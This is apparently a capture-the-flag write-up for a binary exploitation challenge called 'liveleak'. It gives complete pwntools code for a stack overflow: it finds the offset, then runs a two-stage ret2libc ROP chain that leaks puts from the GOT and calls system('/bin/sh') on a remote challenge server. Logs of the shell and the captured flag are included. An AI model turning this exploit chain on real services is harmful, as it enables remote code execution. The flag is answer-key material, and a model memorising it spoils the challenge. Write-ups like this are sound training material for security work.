### **liveleak**

![image 2](https://github.com/user-attachments/assets/dfdfa5e8-69f2-4483-b3c2-0f3397fee2ec)


**Goal**: Get the flag from /flag on the server at 34.133.69.112:10007 using the provided binary chall.

---

## Find Offset

**script**

```python
from pwn import *

# Generate a 100-byte cyclic pattern
pattern = cyclic(100)
with open("pattern.txt", "wb") as f:
    f.write(pattern)

# Run the binary with the pattern
p = process(["./ld-2.35.so", "./chall"])
p.sendline(pattern)
p.wait()

# Check the crash to find the offset
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))
print(f"Offset: {offset}")
                                                                            
```

**output**

```python
[+] Starting local process './ld-2.35.so': pid 10845
[*] Process './ld-2.35.so' stopped with exit code -11 (SIGSEGV) (pid 10845)
[+] Parsing corefile...: Done
[*] '/home/kali/Downloads/core.10845'
    Arch:      amd64-64-little
    RIP:       0x401291
    RSP:       0x7ffffcb64e58
    Exe:       '/home/kali/Downloads/ld-2.35.so' (0x7fd170151000)
    Fault:     0x6161617461616173
[!] cyclic_find() expected a 4-byte subsequence, you gave b'saaataaa'
    Unless you specified cyclic(..., n=8), you probably just want the first 4 bytes.
    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=8) to override this.
Offset: 72
                                          
```

## Plan in 3 Steps

1. **Leak an Address**: Trick the program into printing a memory address from libc (a library it uses).
2. **Find Key Addresses**: Use the leaked address to locate system (runs commands) and /bin/sh (a shell).
3. **Get a Shell**: Run system("/bin/sh") to open a shell and grab the flag.

---

## Step-by-Step Exploit

### 1. Leak the Address

- Send a payload to make the program print the address of puts (a function in libc).
- **Payload**:
    - 72 bytes of junk (As).
    - Special addresses to call puts and return to main.

```python
payload = b"A" * 72
payload += b"\xbd\x12\x40\x00\x00\x00\x00\x00"  *# pop rdi; ret*
payload += b"\x18\x40\x40\x00\x00\x00\x00\x00"  *# puts@GOT*
payload += b"\x90\x10\x40\x00\x00\x00\x00\x00"  *# puts@PLT*
payload += b"\x92\x12\x40\x00\x00\x00\x00\x00"  *# main*
```

- Result: You get an address like 0x7f1234567e50.

### 2. Calculate Addresses

- Subtract 0x80e50 (the offset of puts in libc) from the leaked address to find the libc base.
- Add offsets to find:
    - system: base + 0x50d70
    - /bin/sh: base + 0x1d8678

### 3. Get the Shell

- Send a second payload to call system("/bin/sh").
- **Payload**:
    - 72 bytes of junk.
    - Align the stack, then call system with /bin/sh.

```python
payload = b"A" * 72
payload += b"\x1a\x10\x40\x00\x00\x00\x00\x00"  *# ret*
payload += b"\xbd\x12\x40\x00\x00\x00\x00\x00"  *# pop rdi; ret*
payload += p64(bin_sh_addr)  *# /bin/sh address*
payload += p64(system_addr)  *# system address*
```

---

## Full Exploit Code

```python
from pwn import *

# Set up the context
context.binary = "/home/kali/Downloads/chall"
context.log_level = "info"

# Connect to the remote server
p = remote("34.133.69.112", 10007)

# Binary addresses (these remain the same as local)
pop_rdi = 0x4012bd       # Gadget: pop rdi; ret
puts_plt = 0x401090      # PLT address of puts
puts_got = 0x404018      # GOT address of puts
main_addr = 0x401292     # Address to return to main after leak
ret_gadget = 0x40101a    # Simple ret gadget for stack alignment

# Step 1: Leak the puts address from libc
payload = b"A" * 72      # Padding to overwrite return address
payload += p64(pop_rdi)  # pop rdi; ret
payload += p64(puts_got) # Argument: address of puts in GOT
payload += p64(puts_plt) # Call puts to leak the address
payload += p64(main_addr)# Return to main for second input

info("Sending payload to leak libc address")
p.recvuntil(b"Enter your input: ")
p.sendline(payload)

# Receive and parse the leaked address
p.recvline()  # Discard input echo or newline
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
info(f"Leaked puts address: {hex(leak)}")

# Step 2: Calculate libc base and function addresses
puts_offset = 0x80e50    # Offset of puts in libc (same as local)
libc_base = leak - puts_offset
info(f"Libc base: {hex(libc_base)}")

system_offset = 0x50d70  # Offset of system in libc
bin_sh_offset = 0x1d8678 # Offset of /bin/sh string in libc
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
info(f"System address: {hex(system_addr)}")
info(f'/bin/sh address: {hex(bin_sh_addr)}')

# Step 3: Craft payload to call system("/bin/sh") with stack alignment
payload = b"A" * 72      # Padding
payload += p64(ret_gadget)# ret gadget to align stack
payload += p64(pop_rdi)  # pop rdi; ret
payload += p64(bin_sh_addr)# Set rdi to "/bin/sh" address
payload += p64(system_addr)# Call system("/bin/sh")

info("Sending payload to get shell")
p.recvuntil(b"Enter your input: ")
p.sendline(payload)

# Switch to interactive mode to interact with the shell
p.interactive()
```

**output**

```python
*] '/home/kali/Downloads/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 34.133.69.112 on port 10007: Done
[*] Sending payload to leak libc address
[*] Leaked puts address: 0x73b5c73f6e50
[*] Libc base: 0x73b5c7376000
[*] System address: 0x73b5c73c6d70
[*] /bin/sh address: 0x73b5c754e678
[*] Sending payload to get shell
[*] Switching to interactive mode

$ whoami
pwnuser
$ cat /flag
umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}

```

---

Get the Flag

- In the shell, type: cat /flag
- Example flag: umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}
